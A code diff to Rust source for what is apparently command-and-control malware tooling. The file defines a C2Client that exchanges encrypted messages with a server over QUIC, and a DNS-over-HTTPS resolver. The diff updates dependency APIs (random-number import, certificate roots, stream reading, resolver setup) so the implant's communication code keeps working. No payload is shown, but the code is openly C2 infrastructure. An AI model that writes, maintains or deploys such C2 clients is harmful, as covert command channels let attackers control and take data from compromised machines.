@@ -1,8 +1,9 @@
 use anyhow::{anyhow, Result};
 use chacha20poly1305::{
-    aead::{Aead, KeyInit, OsRng},
+    aead::{Aead, KeyInit, AeadCore},
     XChaCha20Poly1305, XNonce,
 };
+use rand::rngs::OsRng;
 use quinn::{ClientConfig, Endpoint};
 use rustls::{ClientConfig as RustlsClientConfig, RootCertStore};
 use serde::{Deserialize, Serialize};
@@ -88,7 +89,7 @@ impl C2Client {
         let mut endpoint = Endpoint::client("0.0.0.0:0".parse().unwrap())?;
         let mut root_store = RootCertStore::empty();
         root_store.add_server_trust_anchors(
-            webpki_roots::TLS_SERVER_ROOTS.0.iter().map(|ta| {
+            webpki_roots::TLS_SERVER_ROOTS.iter().map(|ta| {
                 rustls::OwnedTrustAnchor::from_subject_spki_name_constraints(
                     ta.subject,
                     ta.spki,
@@ -132,8 +133,7 @@ impl C2Client {
             send_stream.finish().await?;
 
             // Receive
-            let mut buf = Vec::new();
-            recv_stream.read_to_end(&mut buf).await?;
+            let buf = recv_stream.read_to_end(10 * 1024 * 1024).await?;
             if buf.is_empty() {
                 return Ok(None);
             }
@@ -263,11 +263,11 @@ impl DoHResolver {
         } else if server_url.contains("quad9") {
             ResolverConfig::quad9_https()
         } else {
-            ResolverConfig::google_https()
+            ResolverConfig::google()
         };
 
         let opts = ResolverOpts::default();
-        let resolver = TokioAsyncResolver::tokio(config, opts);
+        let resolver = TokioAsyncResolver::tokio(config, opts)?;
         Ok(DoHResolver { resolver })
     }
 
